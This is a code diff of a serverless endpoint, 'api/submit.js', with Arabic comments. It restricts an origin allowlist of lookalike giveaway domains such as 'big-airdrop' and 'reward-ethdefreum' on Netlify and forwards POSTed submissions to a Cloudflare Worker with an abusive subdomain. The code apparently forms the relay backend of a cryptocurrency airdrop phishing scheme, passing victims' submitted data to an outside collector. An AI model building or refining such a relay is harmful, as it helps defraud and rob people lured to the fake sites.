@@ -1,7 +1,7 @@
 // api/submit.js
 
 // الأصول المسموح بها
-const STRICT_ORIGINS = [
+const ALLOWED_ORIGINS = [
   "https://big-airdrop.netlify.app",
   "https://reward-ethdefreum.netlify.app",
   "https://frdees-vip.netlify.app",
@@ -10,29 +10,20 @@ const STRICT_ORIGINS = [
   "https://freefd-vip.netlify.app",
   "https://free-chances.netlify.app",
   "https://free-vfdip.netlify.app",
-  "https://q-ethds.pagdes.dev"
+  "https://q-ethds.pagdes.dev",
 ];
 
-// أصول التطوير (اختياري)
-const EXTRA_DEV_ORIGINS = [
-  "http://localhost:3000",
-  "http://localhost:5173",
-  "http://127.0.0.1:5500",
-  "http://127.0.0.1:8080"
-];
-
-const FALLBACK_ORIGIN = "https://big-airdrop.netlify.app"; // 👈 تثبيت عند غياب Origin/Referer
-const ALLOWED_ORIGINS = [...STRICT_ORIGINS, ...EXTRA_DEV_ORIGINS];
-
-// رابط الـ Worker
 const WORKER_URL = "https://1fuckurmotherhahahahahahaha.eth2-stiffness640.workers.dev/";
 
+// استخراج origin من الـ Referer
 function originFromReferer(referer = "") {
   try {
     if (!referer) return "";
     const u = new URL(referer);
     return `${u.protocol}//${u.host}`;
-  } catch { return ""; }
+  } catch {
+    return "";
+  }
 }
 
 function corsHeaders(origin) {
@@ -45,15 +36,13 @@ function corsHeaders(origin) {
 }
 
 export default async function handler(req, res) {
-  // استخرج origin أو اشتقه من referer أو استخدم FALLBACK_ORIGIN
   const reqOrigin = req.headers.origin || "";
   const referer = req.headers.referer || "";
-  let derivedOrigin = reqOrigin || originFromReferer(referer) || FALLBACK_ORIGIN;
+  const derivedOrigin = reqOrigin || originFromReferer(referer);
 
-  // DEBUG GET: يساعد في التشخيص عند الفتح المباشر
+  // DEBUG GET: لو فتحت الرابط في المتصفح مباشرة
   if (req.method === "GET") {
     return res.status(200).json({
-      hint: "Use POST from your site",
       origin: reqOrigin || null,
       referer: referer || null,
       derivedOrigin,
@@ -78,7 +67,7 @@ export default async function handler(req, res) {
   }
 
   try {
-    // مرر الطلب إلى الـ Worker واضبط Origin كما يريد الـ Worker للتحقق
+    // تمرير الطلب للـ Worker مع origin الصحيح
     const response = await fetch(WORKER_URL, {
       method: "POST",
       headers: {
